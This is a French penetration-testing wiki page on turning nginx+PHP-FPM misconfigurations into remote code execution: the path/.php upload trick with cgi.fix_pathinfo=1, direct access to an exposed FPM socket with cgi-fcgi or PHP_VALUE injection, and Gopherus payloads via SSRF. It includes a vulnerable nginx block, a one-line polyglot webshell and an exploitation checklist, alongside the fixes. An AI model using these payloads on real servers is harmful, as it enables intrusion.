---
order: 2
title: "FastCGI et PHP-FPM nginx : exécution d'upload et contrôle de SCRIPT_FILENAME"
description: "Exploitation du câblage nginx+PHP-FPM : la faille fastcgi_split_path_info plus cgi.fix_pathinfo qui exécute les uploads via path/.php, les sockets FPM exposés et le contrôle de SCRIPT_FILENAME pour une exécution arbitraire."
keywords:
  - fastcgi_split_path_info
  - cgi.fix_pathinfo
  - php-fpm
  - SCRIPT_FILENAME
  - upload rce nginx
---

# FastCGI et PHP-FPM

nginx transmet les requêtes PHP à PHP-FPM via FastCGI, en passant `SCRIPT_FILENAME` (le fichier que FPM exécute). Les erreurs nginx classiques ici exécutent des fichiers qui n'étaient jamais censés tourner, transformant un upload en RCE.

## La faille d'exécution path/.php

Un `location` regex qui transmet à FPM tout ce qui correspond à `\.php`, combiné à `fastcgi_split_path_info` et à l'historique `cgi.fix_pathinfo=1`, exécute des fichiers qui *contiennent* simplement `.php` dans le chemin :

```nginx
location ~ \.php$ {
    fastcgi_split_path_info ^(.+\.php)(/.+)$;
    fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
    fastcgi_pass 127.0.0.1:9000;
}
```

Une requête comme :

```
GET /uploads/avatar.jpg/x.php HTTP/1.1
```

correspond à `\.php`, et avec `cgi.fix_pathinfo=1` FPM se rabat sur l'exécution de `/uploads/avatar.jpg` comme PHP quand `x.php` n'existe pas. Une image téléversée portant `<?php ... ?>` s'exécute alors. C'est le canonique « téléverser un JPEG, obtenir une RCE » sur les stacks nginx+PHP. Le correctif est `try_files $uri =404;` dans le location PHP (pour que les scripts inexistants ne soient pas passés à FPM) et `cgi.fix_pathinfo=0`, mais le motif vulnérable est répandu.

## Socket FPM exposé

Si le socket TCP de PHP-FPM (classiquement `127.0.0.1:9000`, parfois lié à toutes les interfaces) est joignable, nginx n'est pas nécessaire : parlez FastCGI directement et réglez `SCRIPT_FILENAME` sur n'importe quel fichier PHP, ou injectez des paramètres `PHP_VALUE` (`auto_prepend_file=php://input`, `allow_url_include=On`) pour exécuter le corps de la requête :

```bash
SCRIPT_FILENAME=/var/www/html/index.php \
  cgi-fcgi -bind -connect 127.0.0.1:9000
```

`Gopherus` fabrique le paquet FastCGI brut, ce qui permet aussi d'atteindre FPM via une SSRF sous forme de payload `gopher://127.0.0.1:9000/...` (voir [SSRF via proxy_pass variable](variable-proxy-pass-ssrf.md)).

## Exploitation

- Testez l'astuce `path/.php` contre tout répertoire d'upload ou statique, associée à une image polyglotte portant `<?php` (`GIF89a;<?php system($_GET['c']); ?>`).
- Scannez les ports à la recherche d'un `9000/tcp` exposé ; s'il est présent, utilisez `cgi-fcgi`/Gopherus pour régler `SCRIPT_FILENAME` et exécuter, ou injectez `PHP_VALUE`.
- Quand FPM n'est joignable que via SSRF, construisez le payload FastCGI `gopher://` avec Gopherus.

## Outils

- **cgi-fcgi**, **Gopherus**, scripts d'exploitation FastCGI.

## Références

- nginx : fastcgi_split_path_info ; PHP : cgi.fix_pathinfo ; documentation PHP-FPM
- Recherche Gopherus FastCGI
